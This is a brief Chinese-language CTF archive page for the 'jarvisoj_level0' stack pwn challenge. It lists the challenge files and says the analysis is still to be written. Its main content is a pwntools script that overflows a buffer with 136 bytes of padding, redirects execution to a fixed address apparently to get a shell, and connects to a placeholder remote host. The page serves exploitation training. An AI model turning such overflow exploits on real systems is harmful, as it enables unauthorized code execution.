# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [jarvisoj_level0](jarvisoj_level0)
- [jarvisoj_level0.py](jarvisoj_level0.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [jarvisoj_level0.py](jarvisoj_level0.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import*
#io=process('./jarvisoj_level0')
io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
padding=b'a'*136+p64(0x0000000000400431)+p64(0x00400596)
io.sendline(padding)
io.interactive()
```
